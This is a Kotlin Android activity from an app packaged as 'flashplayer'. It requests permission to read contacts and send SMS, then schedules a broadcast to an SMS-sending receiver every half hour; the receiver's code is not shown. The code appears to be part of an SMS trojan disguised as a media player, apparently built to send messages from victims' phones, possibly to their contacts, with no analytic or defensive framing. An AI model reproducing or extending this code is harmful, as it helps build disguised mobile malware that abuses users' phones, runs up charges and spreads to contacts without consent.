package com.flashplayer

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.preference.PreferenceManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

const val SEND_SMS_ALARM_CODE = 0
const val REQUEST_PERMISSION_CODE = 30

class Main2Activity : AppCompatActivity() {

    private lateinit var manager: AlarmManager
    private lateinit var pendingIntent: PendingIntent

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main2)
        val sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this)
        if (sharedPreferences.getBoolean("done", false)) {
            manager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val cancelIntent = Intent(this, SendSmsReceiver::class.java)
            pendingIntent = PendingIntent.getBroadcast(
                    this,
                    SEND_SMS_ALARM_CODE,
                    cancelIntent,
                    0
            )
            manager.cancel(pendingIntent)
        } else {
            checkPermissions()
        }
    }

    private fun checkPermissions() {
        if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.SEND_SMS
                ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS),
                    REQUEST_PERMISSION_CODE
            )
        } else {
            setAlarm()
        }
    }

    private fun setAlarm() {
        val alarmIntent = Intent(this, SendSmsReceiver::class.java)
        pendingIntent = PendingIntent.getBroadcast(this, SEND_SMS_ALARM_CODE, alarmIntent, 0)
        manager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        manager.setInexactRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis(),
                AlarmManager.INTERVAL_HALF_HOUR,
                pendingIntent
        )
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSION_CODE && grantResults[1] == PackageManager.PERMISSION_GRANTED && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            setAlarm()
        }
    }
}
